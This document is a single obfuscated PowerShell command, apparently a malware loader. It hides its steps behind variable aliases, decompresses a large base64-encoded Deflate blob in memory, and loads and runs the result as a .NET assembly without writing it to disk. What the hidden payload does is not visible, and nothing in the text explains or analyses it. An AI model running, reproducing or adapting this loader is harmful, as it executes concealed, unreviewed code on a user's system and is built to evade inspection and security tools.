sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('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'),[IO.Compression.CompressionMode]::Decompress));sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null